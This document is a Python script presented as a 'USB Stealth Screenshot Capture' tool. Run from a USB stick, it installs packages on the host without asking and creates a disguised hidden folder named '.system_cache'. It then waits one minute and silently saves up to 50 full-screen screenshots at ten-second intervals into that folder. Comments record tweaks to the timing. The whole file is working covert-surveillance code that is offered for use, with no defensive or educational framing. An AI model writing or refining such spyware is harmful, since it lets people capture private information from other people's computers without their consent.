
import os
import sys
import time
import socket
import requests
from datetime import datetime
import threading

try:
    from PIL import ImageGrab
except ImportError:
    # If PIL is not available, we'll use alternative methods
    pass

def get_usb_drive():
    """Get the USB drive letter where this script is running from."""
    if os.name == 'nt':  # Windows
        script_path = os.path.abspath(__file__)
        drive = os.path.splitdrive(script_path)[0]
        return drive
    else:  # Linux/Mac - use current directory
        return os.path.dirname(os.path.abspath(__file__))

def create_hidden_folder(usb_path):
    """Create a hidden folder on the USB drive."""
    hidden_folder = os.path.join(usb_path, ".system_cache")
    
    # Create the folder if it doesn't exist
    if not os.path.exists(hidden_folder):
        os.makedirs(hidden_folder)
    
    # Make it hidden (Windows)
    if os.name == 'nt':
        try:
            import ctypes
            ctypes.windll.kernel32.SetFileAttributesW(hidden_folder, 0x02)
        except:
            pass
    
    return hidden_folder

def check_internet_connection():
    """Check if internet connection is available."""
    print("🔍 Checking internet connection...")
    
    # Method 1: Try socket connection to Google DNS
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=10)
        print("✅ Internet connection available (socket test)")
        return True
    except OSError:
        pass
    
    # Method 2: Try HTTP request
    try:
        response = requests.get("http://www.google.com", timeout=10)
        if response.status_code == 200:
            print("✅ Internet connection available (HTTP test)")
            return True
    except:
        pass
    
    print("❌ No internet connection detected")
    return False

def take_screenshot(save_path, attempt=1):
    """Take a screenshot and save it to the specified path."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"screenshot_{timestamp}_{attempt:02d}.png"
    filepath = os.path.join(save_path, filename)
    
    try:
        # Method 1: Using PIL (preferred)
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(filepath, "PNG")
            print(f"📸 Screenshot saved: {filename}")
            return True
        except NameError:
            pass  # PIL not available
        
        # Method 2: Using pyautogui if available
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            screenshot.save(filepath)
            print(f"📸 Screenshot saved: {filename}")
            return True
        except ImportError:
            pass
        
        # Method 3: Platform-specific methods
        if os.name == 'nt':  # Windows
            try:
                import win32gui
                import win32ui
                import win32con
                
                # Get desktop window
                hdesktop = win32gui.GetDesktopWindow()
                
                # Get desktop dimensions
                width = win32gui.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
                height = win32gui.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
                left = win32gui.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
                top = win32gui.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
                
                # Create device context
                desktop_dc = win32gui.GetWindowDC(hdesktop)
                img_dc = win32ui.CreateDCFromHandle(desktop_dc)
                mem_dc = img_dc.CreateCompatibleDC()
                
                # Create bitmap
                screenshot = win32ui.CreateBitmap()
                screenshot.CreateCompatibleBitmap(img_dc, width, height)
                mem_dc.SelectObject(screenshot)
                
                # Copy screen to bitmap
                mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
                
                # Save bitmap
                screenshot.SaveBitmapFile(mem_dc, filepath)
                
                # Cleanup
                mem_dc.DeleteDC()
                win32gui.DeleteObject(screenshot.GetHandle())
                print(f"📸 Screenshot saved: {filename}")
                return True
                
            except ImportError:
                print("❌ No screenshot method available")
                return False
        else:  # Linux/Mac
            try:
                # Try using scrot on Linux
                import subprocess
                subprocess.run(["scrot", filepath], check=True)
                print(f"📸 Screenshot saved: {filename}")
                return True
            except:
                print("❌ No screenshot method available")
                return False
                
    except Exception as e:
        print(f"❌ Error taking screenshot: {e}")
        return False

def wait_and_capture(usb_path, wait_minutes=1):  # ← CHANGED FROM 2 TO 1 MINUTE
    """Wait for specified time and then start capturing screenshots."""
    hidden_folder = create_hidden_folder(usb_path)
    
    print(f"⏰ Waiting {wait_minutes} minutes before starting...")
    print(f"💾 Screenshots will be saved to: {hidden_folder}")
    
    # Wait for the specified time
    wait_seconds = wait_minutes * 60
    for i in range(wait_seconds, 0, -1):
        if i % 30 == 0:  # Show progress every 30 seconds
            minutes_left = i // 60
            seconds_left = i % 60
            print(f"⏳ {minutes_left}:{seconds_left:02d} remaining...")
        time.sleep(1)
    
    print("🚀 Starting screenshot capture...")
    
    # Capture screenshots in a loop
    screenshot_count = 0
    max_screenshots = 50  # Safety limit
    
    while screenshot_count < max_screenshots:
        success = take_screenshot(hidden_folder, screenshot_count + 1)
        if success:
            screenshot_count += 1
        
        # Wait 10 seconds between screenshots ← CHANGED FROM 5 TO 10 SECONDS
        print("⏳ Waiting 10 seconds for next screenshot...")
        time.sleep(10)  # ← CHANGED FROM 5 TO 10 SECONDS
    
    print(f"✅ Completed! Captured {screenshot_count} screenshots.")

def install_requirements():
    """Install required packages if possible."""
    requirements = ['pillow', 'pyautogui', 'pywin32']
    
    for package in requirements:
        try:
            if package == 'pillow':
                __import__('PIL')
            elif package == 'pywin32':
                __import__('win32gui')
            else:
                __import__(package)
            print(f"✅ {package} is available")
        except ImportError:
            print(f"📦 Installing {package}...")
            try:
                import subprocess
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                print(f"✅ {package} installed successfully")
            except:
                print(f"❌ Failed to install {package}")

def main():
    """Main function."""
    print("=" * 50)
    print("🕵️‍♂️ USB Stealth Screenshot Capture")
    print("=" * 50)
    
    # Get USB drive path
    usb_path = get_usb_drive()
    print(f"📀 USB Drive detected: {usb_path}")
    
    # Try to install requirements
    print("\n🔧 Checking dependencies...")
    install_requirements()
    
    # Check internet connection
    print("\n🌐 Network check...")
    internet_available = check_internet_connection()
    
    # Use shorter wait time - 1 minute instead of 10 ← CHANGED HERE TOO
    wait_time = 1  # ← CHANGED FROM 10 TO 1 MINUTE
    
    if internet_available:
        print(f"\n✅ Conditions met. Starting capture sequence in {wait_time} minute...")
        wait_and_capture(usb_path, wait_minutes=wait_time)
    else:
        print(f"\n⚠️ No internet detected. Starting capture in {wait_time} minute...")
        wait_and_capture(usb_path, wait_minutes=wait_time)
    
    print("\n🎯 Operation completed successfully!")
    print("💾 Check the hidden folder on your USB drive for screenshots.")

if __name__ == "__main__":
    # Add a small delay to ensure USB is fully mounted
    time.sleep(5)
    main()